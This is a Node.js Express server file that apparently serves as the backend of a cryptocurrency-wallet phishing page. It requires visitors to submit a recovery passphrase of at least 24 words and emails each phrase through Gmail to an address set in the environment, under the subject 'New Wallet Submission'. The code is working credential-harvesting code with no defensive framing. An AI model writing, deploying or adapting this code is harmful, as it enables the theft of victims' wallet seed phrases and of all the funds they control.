require('dotenv').config();
const express = require('express');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Serve index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Form submit handler
app.post('/submit', (req, res) => {
  const phrase = req.body.passphrase;

  if (!phrase || phrase.trim().split(/\s+/).length < 24) {
    return res.status(400).send('Passphrase must be at least 24 words');
  }

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS
    }
  });

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_TO,
    subject: 'New Wallet Submission',
    text: `Passphrase: ${phrase}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('❌ Email error:', error);
      return res.status(500).send('Email failed');
    }
    console.log('✅ Email sent:', info.response);
    res.sendFile(path.join(__dirname, 'public', 'wallet.html'));
  });
});

// Catch-all
app.get('*', (req, res) => {
  res.status(404).send('404 Not Found');
});

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
